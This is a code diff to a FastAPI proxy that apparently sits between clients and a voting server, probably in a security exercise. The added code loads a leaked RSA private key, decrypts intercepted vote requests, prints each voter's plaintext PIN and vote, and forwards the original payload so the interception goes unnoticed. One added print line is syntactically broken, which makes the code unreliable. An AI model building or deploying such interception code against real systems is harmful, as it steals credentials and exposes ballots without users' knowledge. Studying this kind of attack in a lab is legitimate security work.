@@ -25,6 +25,11 @@ from fastapi.responses import Response
 # NEW IMPORTS
 import asyncio
 import bruteForce
+import rsa
+
+#load leaked private key for man in the middle attack
+with open("private.pem", "rb") as f:
+    priv_key = rsa.PrivateKey.load_pkcs1(f.read())
 
 # this is us
 app = FastAPI()
@@ -95,14 +100,26 @@ async def authorize_pin_endpoint(request: Request):
         return Response(status_code=status.HTTP_400_BAD_REQUEST, content=json.dumps({"message": "Unknown error occurred, please try again!"}))
 
 
-# appears to work fully
+# appears to work fully - added snooping
 @app.post("/vote")
 async def vote_endpoint(request: Request):
-    # gets the data field from the client's request so we can pretend to be the client
+    #intercepting payload
     encrypted_vote = await request.body()
-    # ask the server for the client's request
+    
+    #decrypt the payload using the leaked private key
+    try:
+        decrypted_vote = rsa.decrypt(encrypted_vote, priv_key)
+        vote_data = json.loads(decrypted_vote)
+        print(f"\nBreach)
+        print(f"Intercepted Plaintext PIN: {vote_data['PIN']}")
+        print(f"Intercepted Vote For: {vote_data['Vote']}\n")
+    except Exception as e:
+        print(f"Failed to decrypt intercepted payload: {e}")
+
+    # forward original encrypted payload to real server
     response = requests.post(url=f"{SERVER_URL}/vote", data=encrypted_vote, headers={'Content-Type': 'application/octet-stream'})
 
+    #Return the exact response back to the client
     if response.status_code == 401:
         return Response(status_code=status.HTTP_401_UNAUTHORIZED)
     elif response.status_code == 403:
